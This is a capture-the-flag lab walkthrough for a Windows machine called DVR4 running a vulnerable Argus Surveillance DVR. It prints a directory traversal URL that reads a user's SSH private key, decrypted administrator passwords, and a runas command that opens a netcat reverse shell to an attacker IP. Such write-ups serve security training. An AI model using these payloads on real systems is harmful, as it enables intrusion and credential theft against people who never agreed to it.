---
description: Privilege Escalation using RunAs
---

# DVR4

## Summary

* This machine ran an older version of Argus Surveillance DVR, which was vulnerable to a [Directory Traversal exploit](https://www.exploit-db.com/exploits/45296).
  * The machine also had an SSH port open, so the initial foothold plan was to get a private SSH key by exploiting the directory traversal vulnerability and attempting to ssh into the machine.
* Two usernames were identified from the Argus user dashboard, one of which had an associated SSH private key obtained via the directory traversal exploit.
* Within the system, an encrypted password was discovered in the `DVRParams.ini` file. [Weak encryption methods](https://www.exploit-db.com/exploits/50130) allowed the decryption of the password, granting plain-text access to the admin user account.
* Despite SSH access being disabled for the admin user, elevated privileges were achieved using the `runas` command.

## Let's Unpack

### Enumeration

```bash
# Port Scanning
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.172.179

# Got 2 usernames from manual enumeration 
- Administrator
- Viewer
```

### Initial Foodhold

The plan is to get the <mark style="background-color:red;">id\_rsa</mark> key into the box using a directory traversal exploit and ssh.

The Location of `id_rsa` in Windows:

```powershell
C:/Users/<username>/.ssh/id_rsa

# in our case, it must be 
C:/Users/viewer/.ssh/id_rsa

# Getting the key
http://192.168.172.179:8080/WEBACCOUNT.CGI?RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa

# SSH into the box
chmod 400 id_rsa
ssh -i id_rsa viewer@192.168.172.179
```

### Priv Escalation

Found the encrypted Password in the following directory.

```
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
```

Used the following script to decrypt the password

{% embed url="https://github.com/s3l33/CVE-2022-25012" %}

```bash
# Decrupted passwords
Username: Administrator
password0: 14WatchD0g$
password1: ImWatchingY0u
```

Since SSH was disabled on Administrator, I used <mark style="background-color:red;">runas</mark> to get root shell

```bash
runas /user:administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.45.152 443" 

# catching the shell using nc
nc -nlvp 443

# Boom Got NT AUTHORITY\SYSTEM shell
```

